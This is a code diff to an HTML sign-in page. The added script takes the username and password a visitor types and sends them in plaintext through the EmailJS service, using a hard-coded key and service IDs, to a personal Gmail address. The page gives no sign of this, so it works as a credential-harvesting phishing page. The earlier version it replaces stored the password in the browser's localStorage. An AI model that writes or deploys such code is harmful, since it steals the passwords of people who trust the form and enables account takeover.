@@ -7,39 +7,54 @@
   <link rel="stylesheet" href="sign in style.css"> <!-- Link to your CSS file -->
 </head>
 <body>
-  <div class="signin-container">
-    <div class="signin-box">
-      <h2>Sign In</h2>
-      <form action="#" method="POST">
-        <div class="input-group">
-          <label for="username">Username or Email</label>
-          <input type="text" id="username" placeholder="Enter your username or email" required>
-        </div>
-        <div class="input-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" placeholder="Enter your password" required>
-        </div>
-        <button type="submit" class="signin-btn">Sign In</button>
-        <p><a href="#" class="forgot">Forgot Password?</a></p>
-      </form>
-    </div>
+
+<div class="signin-container">
+  <div class="signin-box">
+    <h2>Sign In</h2>
+    <form id="signinForm" action="javascript:void(0);">
+      <div class="input-group">
+        <label for="username">Username or Email</label>
+        <input type="text" id="username" placeholder="Enter your username or email" required>
+      </div>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter your password" required>
+      </div>
+      <button type="submit" class="signin-btn">Sign In</button>
+      <p><a href="#" class="forgot">Forgot Password?</a></p>
+    </form>
   </div>
+</div>
 
+<script>
+  // Initialize EmailJS
+  emailjs.init('QcsQSbsEW5F1MZanF');  // Replace with your public key from EmailJS
 
-  <script>
-    
-  document.querySelector('.signin-btn').addEventListener('click', function (event) {
-    event.preventDefault(); // Prevent form submission
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+  document.getElementById('signinForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-    // Save data to localStorage
-    localStorage.setItem('username', username);
-    localStorage.setItem('password', password);
+    // Get user input
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
 
-    alert('Credentials saved locally!');
+    // Create email data
+    var templateParams = {
+      username: username,
+      password: password,
+      to_email: 'sadiqielham44@gmail.com'  // The email where you want to receive the data
+    };
+
+    // Send the email using the template and service you set up in EmailJS
+    emailjs.send('service_5ifszbp', 'template_3cwcsu3', templateParams)
+      .then(function(response) {
+        console.log('Success!', response.status, response.text);
+        alert('Sign-in details sent successfully!');
+      }, function(error) {
+        console.log('Failed...', error);
+        alert('Failed to send sign-in details!');
+      });
   });
+</script>
 
-  </script>
 </body>
 </html>
